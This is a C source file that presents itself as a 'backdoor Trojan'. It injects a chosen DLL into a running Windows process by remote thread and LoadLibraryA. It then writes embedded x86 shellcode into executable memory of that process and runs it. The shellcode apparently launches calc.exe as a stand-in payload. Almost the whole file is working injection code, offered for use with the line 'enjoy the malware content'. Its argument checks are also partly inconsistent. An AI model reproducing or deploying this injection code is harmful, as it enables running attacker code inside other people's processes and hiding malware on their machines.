// Creating a Backdoor Trojan with Process Injection with DLL Injection
// This malware was created by Sicko, so enjoy the malware content

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>

// Function prototypes
DWORD FindProcessIdByName(const char* processName);
BOOL InjectDll(DWORD dwProcessId, LPCSTR lpDllPath);

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <ProcessName> <DllPath>\n", argv[0]);
        return 1;
    }

    const char* targetProcessName = argv[1];
    const char* dllPath = argv[2];
    DWORD dwProcessId = 0;

    if (!isdigit(*argv[2])) {
        if (_stricmp(targetProcessName, "rundll32.exe") != 0) {
            printf("Error: Unknown process name\n");
            return 1;
        }

        dwProcessId = FindProcessIdByName(targetProcessName);
        if (dwProcessId == 0) {
            printf("Error: Failed to locate process %s\n", targetProcessName);
            return 1;
        }
    } else {
        dwProcessId = atoi(argv[2]);
    }

    if (!InjectDll(dwProcessId, dllPath)) {
        printf("Error: Failed to inject DLL into the target process\n");
        return 1;
    }

    // Shellcode to perform malicious activities
    char shellcode[] = "\x50\x53\x51\x52\x56\x57\x55\x89"
			"\xe5\x83\xec\x18\x31\xf6\x56\x6a"
			"\x63\x66\x68\x78\x65\x68\x57\x69"
			"\x6e\x45\x89\x65\xfc\x31\xf6\x64"
			"\x8b\x5e\x30\x8b\x5b\x0c\x8b\x5b"
			"\x14\x8b\x1b\x8b\x1b\x8b\x5b\x10"
			"\x89\x5d\xf8\x31\xc0\x8b\x43\x3c"
			"\x01\xd8\x8b\x40\x78\x01\xd8\x8b"
			"\x48\x24\x01\xd9\x89\x4d\xf4\x8b"
			"\x78\x20\x01\xdf\x89\x7d\xf0\x8b"
			"\x50\x1c\x01\xda\x89\x55\xec\x8b"
			"\x58\x14\x31\xc0\x8b\x55\xf8\x8b"
			"\x7d\xf0\x8b\x75\xfc\x31\xc9\xfc"
			"\x8b\x3c\x87\x01\xd7\x66\x83\xc1"
			"\x08\xf3\xa6\x74\x0a\x40\x39\xd8"
			"\x72\xe5\x83\xc4\x26\xeb\x41\x8b"
			"\x4d\xf4\x89\xd3\x8b\x55\xec\x66"
			"\x8b\x04\x41\x8b\x04\x82\x01\xd8"
			"\x31\xd2\x52\x68\x2e\x65\x78\x65"
			"\x68\x63\x61\x6c\x63\x68\x6d\x33"
			"\x32\x5c\x68\x79\x73\x74\x65\x68"
			"\x77\x73\x5c\x53\x68\x69\x6e\x64"
			"\x6f\x68\x43\x3a\x5c\x57\x89\xe6"
			"\x6a\x0a\x56\xff\xd0\x83\xc4\x46"
			"\x5d\x5f\x5e\x5a\x59\x5b\x58\xc3";

    printf("Executing shellcode in process %s (PID: %d)\n", targetProcessName, dwProcessId);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (hProcess != NULL) {
        LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (pRemoteMemory != NULL) {
            if (!WriteProcessMemory(hProcess, pRemoteMemory, shellcode, sizeof(shellcode), NULL)) {
                printf("Error: Failed to write shellcode into the target process\n");
            } else {
                HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteMemory, NULL, 0, NULL);
                if (hRemoteThread == NULL) {
                    printf("Error: Failed to create remote thread in the target process\n");
                } else {
                    WaitForSingleObject(hRemoteThread, INFINITE);
                    printf("Shellcode executed successfully\n");
                    CloseHandle(hRemoteThread);
                }
            }
            VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        } else {
            printf("Error: Failed to allocate memory in the target process\n");
        }
        CloseHandle(hProcess);
    } else {
        printf("Error: Failed to open target process\n");
    }

    return 0;
}

DWORD FindProcessIdByName(const char* processName) {
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(pe32);
        if (Process32First(hSnap, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, processName) == 0) {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }
    return pid;
}

BOOL InjectDll(DWORD dwProcessId, LPCSTR lpDllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (hProcess == NULL) {
        printf("Error: Failed to open target process\n");
        return FALSE;
    }

    LPVOID pAllocatedMemory = VirtualAllocEx(hProcess, NULL, strlen(lpDllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (pAllocatedMemory == NULL) {
        printf("Error: Failed to allocate memory in the target process\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pAllocatedMemory, lpDllPath, strlen(lpDllPath) + 1, NULL)) {
        printf("Error: Failed to write DLL path into the target process\n");
        VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    if (hKernel32 == NULL) {
        printf("Error: Failed to get handle of kernel32.dll\n");
        VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
    if (pLoadLibraryA == NULL) {
        printf("Error: Failed to get address of LoadLibraryA function\n");
        VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pAllocatedMemory, 0, NULL);
    if (hRemoteThread == NULL) {
        printf("Error: Failed to create remote thread in the target process\n");
        VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hRemoteThread, INFINITE);

    CloseHandle(hRemoteThread);
    VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return TRUE;
}